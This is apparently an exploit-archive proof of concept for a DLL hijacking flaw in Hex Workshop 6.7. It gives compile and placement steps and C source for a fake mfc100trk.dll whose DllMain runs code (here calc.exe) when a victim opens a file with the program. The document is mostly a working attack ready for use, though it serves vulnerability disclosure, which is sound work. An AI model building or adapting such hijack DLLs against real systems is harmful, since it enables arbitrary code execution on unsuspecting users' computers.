/* # Exploit Title: Hex Workshop v 6.7 (mfc100trk.dll) - DLL Hijacking Vulnerability
// # Date: 29.11.2013
// # Exploit Author: Akin Tosunlar / Ozgur Yurdusev
// # Software Link: http://www.download.com/Hex-Workshop/3000-2352_4-10004918.html?part=dl-HexWorksh&subj=dl&tag=button
// # Version: 6.7 (Probably old version of software and the LATEST version too)
// # Vendor Homepage: http://www.bpsoft.com/
// # Tested on: [ Windows XP sp3]
// # Contact : info@vigasis.com
// #------------------
// # Web Page : http://www.vigasis.com
// # 
// # YOUTUBE EXPLOIT VIDEO: http://www.youtube.com/watch?v=yGGGabFNUiA&feature=youtu.be
// #
// #  gcc -shared -o mfc100trk.dll evil.c
// #  Compile evil.c and rar or zip where you want the file extension (for ex: .byte) and mfc100trk.dll same folder. Associate Default Opener as Hex Workshop or OpenWith Hex Workshop.Double-click File. program start Calc.exe immediately.
// #
*/ 


#include <windows.h>

int evilcode()
{
WinExec("calc", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
evilcode();
return 0;
}
